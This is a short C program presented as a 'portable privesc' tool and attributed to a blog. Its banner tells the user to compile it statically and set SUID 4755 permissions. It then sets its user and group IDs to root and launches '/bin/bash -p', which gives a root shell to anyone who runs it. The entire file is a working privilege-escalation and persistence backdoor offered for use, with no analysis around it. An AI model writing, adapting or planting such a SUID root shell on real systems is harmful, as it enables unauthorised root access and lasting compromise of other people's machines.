#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h> // for denoting unix processes in accurate data types
#include <unistd.h> // posix functions - functions acting as wrappers for the original unix system calls/commands.
int main(){
printf("############################################################################\n");
printf("Portable privesc program that runs on the system supported GLIB_C version.\n");
printf("Blog: mob1us86.medium.com\n");
printf("[!] Ensure this script is statically compiled. (gcc: -static flag)\n");
printf("[!] Ensure the script has proper SUID Permissions 4755 or strictly similar.\n");
printf("############################################################################\n");
printf("Current UID: %u\nCurrent GID: %u\n", getuid(), getgid());
uid_t root = 0;
gid_t rgid = 0;
setuid(root);
setgid(rgid);
printf("New UID: %u\nNew GID: %u\n", getuid(), getgid());
char *argv[] = {"/bin/bash", "-p", NULL};
execve(argv[0], argv, NULL); // argv[0] passes the program path that is to be executed, the argv is the shell alias that is to be used and the last NULL is the terminator
return 0;

}
